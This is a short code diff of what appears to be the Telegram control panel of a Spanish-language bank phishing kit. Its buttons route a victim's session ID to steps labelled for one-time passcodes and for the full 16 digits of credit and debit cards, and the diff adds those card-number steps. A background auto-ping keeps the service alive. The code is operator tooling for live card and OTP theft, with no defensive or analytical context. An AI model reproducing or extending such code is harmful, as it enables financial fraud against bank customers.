@@ -44,11 +44,11 @@ function getPrimaryReplyMarkup(sessionId) {
                 { text: "✅ Siguiente (OTP)", callback_data: `go:opcion1|${sessionId}` }
             ],
             [
-                { text: "💳 Débito", callback_data: `go:debit|${sessionId}` },
-                { text: "🪙 Visa Oro", callback_data: `go:Visa+Oro|${sessionId}` }
+                { text: "💳 Débito", callback_data: `go:partcc|${sessionId}` },
+                { text: "💳 16 de TC", callback_data: `go:Visa+Oro|${sessionId}` }
             ],
             [
-                { text: "💍 Master Clásica", callback_data: `go:Mastercard+Clasica|${sessionId}` },
+                { text: "💳 16 de DB", callback_data: `go:partcc|${sessionId}` },
                 { text: "🌐 Virtual", callback_data: `go:virtualdedbit|${sessionId}` }
             ],
             [
@@ -681,6 +681,7 @@ setInterval(async () => {
     console.error("❌ Error en auto-ping:", error.message);
   }
 }, 180000); // 180000 ms = 3 minutos
+
 
 
 
